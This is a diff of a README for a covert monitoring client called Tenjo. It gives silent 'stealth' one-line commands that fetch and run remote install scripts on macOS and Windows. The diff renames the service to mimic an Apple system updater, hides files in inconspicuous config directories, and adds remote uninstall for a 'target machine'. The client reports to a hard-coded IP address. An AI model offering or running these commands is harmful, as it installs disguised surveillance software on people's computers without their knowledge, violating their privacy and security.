@@ -2,24 +2,14 @@
 
 ## One-Line Remote Installation (Stealth Mode)
 
-### macOS - Silent Installation (Recommended)
+### macOS - Silent Installation
 ```bash
 curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_macos.sh | bash -s true
 ```
 
-### macOS - Alternative Method (if above fails)
-```bash
-curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_macos.sh | bash -s true cleanup
-```
-
-### Windows - Silent Installation (Recommended)
+### Windows - Silent Installation
 ```cmd
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_windows.bat' -OutFile '%TEMP%\quick_install.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_install.bat' true; del '%TEMP%\quick_install.bat'"
-```
-
-### Windows - Alternative Method (if above fails)
-```cmd
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_windows.bat' -OutFile '%TEMP%\install_stealth.bat'; cmd /c '%TEMP%\install_stealth.bat' true cleanup; del '%TEMP%\install_stealth.bat'"
 ```
 
 ## Manual Installation (if needed)
@@ -27,33 +17,35 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/A
 ### macOS
 1. Download repository
 2. Navigate to client directory
-3. Run: `bash install_stealth_macos.sh true cleanup`
+3. Run: `bash quick_install_stealth_macos.sh true`
 
 ### Windows
 1. Download repository
 2. Navigate to client directory
-3. Run: `install_stealth_windows.bat true cleanup`
+3. Run: `quick_install_stealth_windows.bat true`
 
 ## Uninstallation Commands
 
-### macOS (Quick Install Method)
+### macOS - One-Line Remote Uninstall
 ```bash
-bash ~/.system_update/uninstall.sh
+curl -s https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_macos.sh | bash
 ```
 
-### macOS (Alternative Method)
+### Windows - One-Line Remote Uninstall
+```cmd
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_windows.bat' -OutFile '%TEMP%\quick_uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_uninstall.bat'; del '%TEMP%\quick_uninstall.bat'"
+```
+
+### Manual Uninstall (if needed)
+
+#### macOS
 ```bash
-bash ~/.system_update/uninstall_stealth_macos.sh true
+bash quick_uninstall_stealth_macos.sh
 ```
 
-### Windows (Quick Install Method)
+#### Windows
 ```cmd
-"%APPDATA%\SystemUpdate\uninstall.bat"
-```
-
-### Windows (Alternative Method)
-```cmd
-"%APPDATA%\SystemUpdate\uninstall_stealth_windows.bat" true
+quick_uninstall_stealth_windows.bat
 ```
 
 ## Features
@@ -92,14 +84,29 @@ bash ~/.system_update/uninstall_stealth_macos.sh true
 ## Installation Locations
 
 ### macOS
-- **User**: `~/.system_update/`
-- **System**: `/Library/Application Support/SystemUpdate/`
-- **Service**: `~/Library/LaunchAgents/com.system.update.agent.plist`
+- **Install Dir**: `~/.config/system-utils/`
+- **Service**: `~/Library/LaunchAgents/com.apple.systemupdater.plist`
+- **Logs**: `~/Library/Logs/SystemUpdater/`
 
 ### Windows  
-- **User**: `%APPDATA%\SystemUpdate\`
-- **System**: `%PROGRAMDATA%\SystemUpdate\`
-- **Service**: Task Scheduler `SystemUpdateService`
+- **Install Dir**: `%USERPROFILE%\.config\system-utils\`
+- **Task**: Task Scheduler `SystemUpdater`
+- **Logs**: `%USERPROFILE%\AppData\Local\SystemUpdater\`
+
+## Uninstall Features
+
+### ✅ Complete Removal
+- Stops all running processes
+- Removes auto-start configuration
+- Deletes all files and logs
+- Cleans system traces
+- Verifies successful removal
+
+### ✅ One-Line Remote Uninstall
+- No need to access target machine locally
+- Downloads and runs uninstaller automatically
+- Works from any terminal with internet access
+- Provides detailed removal report
 
 ## Security Notes
 
@@ -113,9 +120,9 @@ bash ~/.system_update/uninstall_stealth_macos.sh true
 ## Technical Details
 
 ### Process Names
-- **Main Process**: `stealth_main.py` / `python stealth_main.py`
-- **Service Name**: `SystemUpdateService` / `com.system.update.agent`
-- **Directory Name**: `SystemUpdate` / `.system_update`
+- **Main Process**: `python stealth_main.py`
+- **Service Name**: `SystemUpdater` / `com.apple.systemupdater`
+- **Directory Name**: `system-utils` / `.config/system-utils`
 
 ### Network Communication
 - Connects to: `http://103.129.149.67`
